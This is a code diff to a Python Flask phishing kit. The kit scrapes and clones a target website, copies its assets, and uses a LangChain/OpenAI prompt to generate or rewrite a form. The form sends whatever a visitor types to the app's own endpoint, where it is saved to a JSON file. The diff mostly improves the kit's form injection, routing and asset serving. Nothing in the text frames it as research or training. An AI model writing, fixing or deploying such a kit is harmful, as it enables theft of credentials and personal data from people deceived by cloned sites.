@@ -1,15 +1,26 @@
-from flask import Flask, request, render_template, redirect, url_for, jsonify
+from flask import Flask, request, render_template, redirect, url_for, jsonify, send_from_directory
 from bs4 import BeautifulSoup
 import os
 import requests
 import json
-from transformers import pipeline
+from langchain.chains import LLMChain
+from langchain.prompts import PromptTemplate
+from langchain.llms import OpenAI
 
 app = Flask(__name__)
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-# Load a local model using HuggingFace Transformers
-generator = pipeline('text-generation', model='gpt2')
+# Initialize the LangChain model
+llm = OpenAI(temperature=0)
+
+# Define the prompt template
+prompt_template = PromptTemplate(input_variables=["action_url"], template="""
+Generate a simple HTML form with one text input and a submit button. 
+The form should have the action URL set to {action_url} and the method set to "POST".
+""")
+
+# Create the LLMChain
+form_chain = LLMChain(prompt=prompt_template, llm=llm)
 
 def scrape_website(url):
     response = requests.get(url)
@@ -19,6 +30,10 @@ def scrape_website(url):
 def copy_resources(soup, base_url, target_dir):
     if not os.path.exists(target_dir):
         os.makedirs(target_dir)
+
+    static_dir = os.path.join(target_dir, 'static')
+    if not os.path.exists(static_dir):
+        os.makedirs(static_dir)
     
     for tag in soup.find_all(['link', 'script', 'img']):
         attr = 'href' if tag.name == 'link' else 'src'
@@ -26,26 +41,28 @@ def copy_resources(soup, base_url, target_dir):
             resource_url = tag[attr]
             if resource_url.startswith(('http', 'https')):
                 resource_content = requests.get(resource_url).content
-                resource_path = os.path.join(target_dir, os.path.basename(resource_url))
+                resource_path = os.path.join(static_dir, os.path.basename(resource_url))
                 with open(resource_path, 'wb') as f:
                     f.write(resource_content)
-                tag[attr] = os.path.join('static', os.path.basename(resource_url))
-
+                tag[attr] = url_for('serve_static_file', site_id=os.path.basename(target_dir), filename=os.path.basename(resource_url))
+    
     with open(os.path.join(target_dir, 'index.html'), 'w') as file:
         file.write(str(soup))
 
-def generate_form_with_gpt2():
-    prompt = "Generate a simple HTML form with one text input and a submit button."
-    generated = generator(prompt, max_length=50, num_return_sequences=1)
-    form_html = generated[0]['generated_text']
+def generate_form_with_langchain(action_url):
+    form_html = form_chain.run(action_url=action_url)
     return form_html
 
-def add_phishing_form(soup, target_dir):
+def add_phishing_form(soup, target_dir, site_id):
     form = soup.find('form')
     if not form:
-        form_html = generate_form_with_gpt2()
+        action_url = url_for('handle_submit', site_id=site_id)
+        form_html = generate_form_with_langchain(action_url)
         form_soup = BeautifulSoup(form_html, 'html.parser')
         soup.body.insert(0, form_soup)
+    else:
+        form['action'] = url_for('handle_submit', site_id=site_id)
+        form['method'] = 'POST'
     
     with open(os.path.join(target_dir, 'index.html'), 'w') as file:
         file.write(str(soup))
@@ -61,20 +78,25 @@ def index():
             os.makedirs(data_dir)
         soup = scrape_website(url)
         copy_resources(soup, url, target_dir)
-        add_phishing_form(soup, target_dir)
-        return redirect(url_for('generated_site', site_id=site_id))
+        add_phishing_form(soup, target_dir, site_id)
+        return redirect(url_for('view_generated_site', site_id=site_id))
 
     return render_template('index.html')
 
 @app.route('/site/<int:site_id>')
-def generated_site(site_id):
-    return redirect(url_for('static', filename=f'generated_sites/{site_id}/index.html'))
+def view_generated_site(site_id):
+    generated_site_dir = os.path.join(BASE_DIR, 'generated_sites', str(site_id))
+    return send_from_directory(generated_site_dir, 'index.html')
 
-@app.route('/submit', methods=['POST'])
-def handle_submit():
+@app.route('/site/<int:site_id>/static/<path:filename>')
+def serve_static_file(site_id, filename):
+    static_dir = os.path.join(BASE_DIR, 'generated_sites', str(site_id), 'static')
+    return send_from_directory(static_dir, filename)
+
+@app.route('/submit/<int:site_id>', methods=['POST'])
+def handle_submit(site_id):
     data = request.form['user_input']
-    site_id = request.args.get('site_id')
-    data_file = os.path.join(BASE_DIR, 'generated_sites', site_id, 'data', 'data.json')
+    data_file = os.path.join(BASE_DIR, 'generated_sites', str(site_id), 'data', 'data.json')
     
     if os.path.exists(data_file):
         with open(data_file, 'r') as file:
